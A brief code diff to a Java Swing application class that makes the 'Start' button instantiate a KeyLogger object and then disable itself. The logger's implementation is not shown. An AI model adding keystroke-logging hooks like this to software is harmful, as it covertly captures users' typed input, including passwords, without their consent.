@@ -22,6 +22,8 @@ public class AppDesign extends JFrame {
         startButton.addActionListener(new ActionListener() {
             public void actionPerformed(ActionEvent e) {
                 System.out.println("Start");
+                KeyLogger keyLogger = new KeyLogger();
+                startButton.setEnabled(false);
             }
         });
         add(startButton);
